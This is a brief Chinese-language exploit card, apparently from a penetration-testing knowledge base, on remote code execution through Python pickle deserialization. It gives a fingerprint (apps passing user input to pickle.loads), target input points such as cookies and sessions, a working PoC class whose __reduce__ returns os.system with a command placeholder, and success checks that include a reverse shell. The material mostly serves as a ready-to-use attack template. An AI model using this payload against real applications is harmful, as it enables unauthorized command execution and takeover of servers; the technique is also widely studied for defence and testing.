# Python unpickle 反序列化 RCE

## 指纹特征
- 服务: 使用 `pickle.loads` 反序列化用户输入的 Python 应用

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 反序列化注入 | 任意输入点 (Session/Cookie/Form) | 无 |

## PoC 指令

利用 `__reduce__` 方法构造恶意对象：

```python
import pickle
import os

class exp(object):
    def __reduce__(self):
        return (os.system, ("{{COMMAND}}",))

# 序列化 Payload
payload = pickle.dumps(exp())
```

## Success Signal
- **状态验证**: 命令成功执行。
- **验证回显**: 成功通过反弹 Shell 确认。
